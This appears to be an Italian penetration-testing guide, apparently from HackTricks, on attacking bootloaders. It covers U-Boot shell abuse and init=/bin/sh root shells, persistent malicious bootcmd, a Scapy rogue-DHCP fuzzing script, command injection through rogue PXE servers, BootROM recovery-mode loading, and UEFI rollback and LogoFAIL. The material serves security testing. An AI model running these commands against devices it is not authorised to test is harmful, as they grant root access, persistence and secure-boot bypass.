# Test del Bootloader

{{#include ../../banners/hacktricks-training.md}}

I seguenti passi sono raccomandati per modificare le configurazioni di avvio del dispositivo e testare bootloader come U-Boot e loader di classe UEFI. Concentrati sull'ottenere esecuzione di codice precoce, valutare le protezioni di firma/rollback e sfruttare le modalità di recovery o i percorsi di network-boot.

## U-Boot: guadagni rapidi e abuso dell'environment

1. Accedi alla shell dell'interprete
- Durante il boot, premi un tasto di interruzione conosciuto (spesso qualsiasi tasto, 0, space, o una sequenza "magica" specifica della board) prima che `bootcmd` venga eseguito per entrare al prompt di U-Boot.

2. Ispeziona lo stato di boot e le variabili
- Comandi utili:
- `printenv` (dump dell'environment)
- `bdinfo` (info sulla board, indirizzi di memoria)
- `help bootm; help booti; help bootz` (metodi supportati per il boot del kernel)
- `help ext4load; help fatload; help tftpboot` (loader disponibili)

3. Modifica gli argomenti di boot per ottenere una root shell
- Aggiungi `init=/bin/sh` così il kernel entra in una shell invece del normale init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot dal tuo server TFTP
- Configura la rete e scarica un kernel/fit image dalla LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Rendi persistenti le modifiche tramite l'environment
- Se lo storage dell'env non è write-protected, puoi rendere persistente il controllo:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Controlla variabili come `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` che influenzano i percorsi di fallback. Valori mal configurati possono permettere ripetute interruzioni nella shell.

6. Controlla caratteristiche di debug/insicure
- Cerca: `bootdelay` > 0, `autoboot` disabilitato, `usb start; fatload usb 0:1 ...` senza restrizioni, abilità di `loady`/`loads` via seriale, `env import` da media non attendibili, e kernel/ramdisk caricati senza controlli di firma.

7. Test su immagini/verifica U-Boot
- Se la piattaforma dichiara secure/verified boot con immagini FIT, prova immagini sia non firmate che manomesse:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'assenza di `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o il comportamento legacy `verify=n` spesso permette di eseguire payload arbitrari.

## Superficie di network-boot (DHCP/PXE) e rogue servers

8. Fuzzing dei parametri PXE/DHCP
- L'implementazione legacy BOOTP/DHCP di U-Boot ha avuto problemi di memory-safety. Per esempio, CVE‑2024‑42040 descrive memory disclosure tramite risposte DHCP appositamente costruite che possono leak bytes dalla memoria di U-Boot sulla rete. Esegui code path DHCP/PXE con valori eccessivamente lunghi o borderline (option 67 bootfile-name, vendor options, file/servername fields) e osserva eventuali hang/leak.
- Snippet minimo in Scapy per stressare i parametri di boot durante il netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Verifica anche se i campi del filename PXE vengono passati a logiche di shell/loader senza sanitizzazione quando concatenati a script di provisioning lato OS.

9. Test di command injection via rogue DHCP server
- Monta un servizio rogue DHCP/PXE e prova a iniettare caratteri nei campi filename o options per raggiungere interpreter di comandi nelle fasi successive della catena di boot. Metasploit’s DHCP auxiliary, `dnsmasq`, o script Scapy custom funzionano bene. Assicurati di isolare prima la rete di laboratorio.

## Modalità di recovery BootROM SoC che sovrascrivono il boot normale

Molti SoC espongono una BootROM "loader" mode che accetterà codice via USB/UART anche quando le immagini flash sono invalide. Se i fuse di secure-boot non sono stati bruciati, questo può fornire esecuzione di codice arbitrario molto presto nella catena.

- NXP i.MX (Serial Download Mode)
- Strumenti: `uuu` (mfgtools3) o `imx-usb-loader`.
- Esempio: `imx-usb-loader u-boot.imx` per pushare ed eseguire un U-Boot custom da RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Esempio: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` o `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Esempio: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` per staggiare un loader e caricare un U-Boot custom.

Valuta se il dispositivo ha secure-boot eFuses/OTP bruciati. In assenza, le modalità di download della BootROM spesso bypassano qualsiasi verifica di livello superiore (U-Boot, kernel, rootfs) eseguendo il tuo payload di prima fase direttamente da SRAM/DRAM.

## UEFI/PC-class bootloaders: controlli rapidi

10. Manomissione dell'ESP e test rollback
- Monta la EFI System Partition (ESP) e controlla i componenti del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, percorsi del vendor logo.
- Prova a fare il boot con componenti firmati downgradati o noti vulnerabili se le revoche di Secure Boot (dbx) non sono aggiornate. Se la piattaforma ancora si fida di vecchi shim/bootmanagers, spesso puoi caricare il tuo kernel o un `grub.cfg` dall'ESP per ottenere persistenza.

11. Bug nel parsing dei logo di boot (classe LogoFAIL)
- Diverse firmware OEM/IBV erano vulnerabili a difetti di parsing di immagini in DXE che processano i boot logo. Se un attaccante può posizionare un'immagine appositamente creata sull'ESP sotto un percorso vendor-specific (es., `\EFI\<vendor>\logo\*.bmp`) e rebootare, l'esecuzione di codice durante l'early boot può essere possibile anche con Secure Boot abilitato. Testa se la piattaforma accetta logo forniti dall'utente e se quei percorsi sono scrivibili dall'OS.

## Precauzioni hardware

Sii cauto quando interagisci con SPI/NAND flash durante l'early boot (es., collegare a massa pin per bypassare letture) e consulta sempre il datasheet del flash. Cortocircuiti temporizzati male possono corrompere il dispositivo o il programmer.

## Note e suggerimenti aggiuntivi

- Prova `env export -t ${loadaddr}` e `env import -t ${loadaddr}` per muovere blob dell'environment tra RAM e storage; alcune piattaforme permettono di importare env da media rimovibili senza autenticazione.
- Per persistenza su sistemi Linux che fanno boot tramite `extlinux.conf`, modificare la linea `APPEND` (per iniettare `init=/bin/sh` o `rd.break`) sulla partizione di boot è spesso sufficiente quando non sono applicati controlli di firma.
- Se l'userland fornisce `fw_printenv/fw_setenv`, verifica che `/etc/fw_env.config` corrisponda al reale storage dell'env. Offset mal configurati permettono di leggere/scrivere la regione MTD sbagliata.

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
